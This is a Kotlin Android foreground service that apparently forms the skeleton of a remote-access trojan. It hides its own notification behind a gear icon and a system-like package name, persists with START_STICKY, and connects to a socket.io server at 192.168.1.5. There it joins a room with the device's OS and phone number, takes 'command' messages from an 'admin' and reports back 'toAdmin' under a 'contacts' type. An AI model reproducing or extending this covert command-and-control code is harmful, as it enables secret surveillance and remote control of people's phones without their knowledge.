package android.systems.myapplication
import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.provider.Settings
import androidx.core.app.NotificationCompat
import io.socket.client.Socket
import io.socket.client.IO
import org.json.JSONObject

class ForegroundService:Service() {
    lateinit var mSocket: Socket

    override fun onCreate() {
        mSocket = IO.socket("http://192.168.1.5:80")
        super.onCreate()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createNotificationChannel()
        val intent = Intent(Settings.ACTION_SETTINGS)
        val pendingIntent: PendingIntent = PendingIntent.getActivity(this, 0, intent, 0)



        val notification = NotificationCompat.Builder(this, "notificationChannelId")
            .setSmallIcon(R.drawable.grearicon)
            .setContentTitle("1")
            .setContentIntent(pendingIntent)
            .build()
        startForeground(1, notification)

        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.cancelAll()


        //socket
        try{

            mSocket.connect()
            mSocket.on("msg"){args->
                if(args[0]!=null){
                    var message = args[0] as JSONObject;
                    var data = message.get("command") as String;
                    var sender = message.get("sender") as String;
                    var dateNow = "15/09/1999"
                    var timeNow = "12:15"
                    var username = getString(R.string.username)
                    var room = getString(R.string.room)
                    var obj = "{\"type\":\"contacts\",\"secret\":\"secret\",\"admin\":\"$sender\",\"command\":\"the command (btw fucQ)i got was $data\"," +
                            "\"clientName\":\"$username\",\"date\":\"$dateNow\",\"time\":\"$timeNow\"}"
                    println("the command is $data")

                    mSocket.emit("toAdmin",obj)
                }
            }
            var username = getString(R.string.username)
            var room = getString(R.string.room)
            var cons = "{\"room\":\"$room\",\"username\":\"$username\",\"constr\":{\"os\":\"android\",\"phnum\":\"807564591\"}}"
            mSocket.emit("joinRoom",cons)
        }
        catch (e: Exception){
            print(e)
        }

        return START_STICKY
    }


    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val notificationChannel = NotificationChannel(
                "notificationChannelId",
                "App Name",
                NotificationManager.IMPORTANCE_DEFAULT
            )
            val notificationManager: NotificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(notificationChannel)
        }
    }

    override fun onBind(p0: Intent?): IBinder? {
        TODO("Not yet implemented")
    }


}
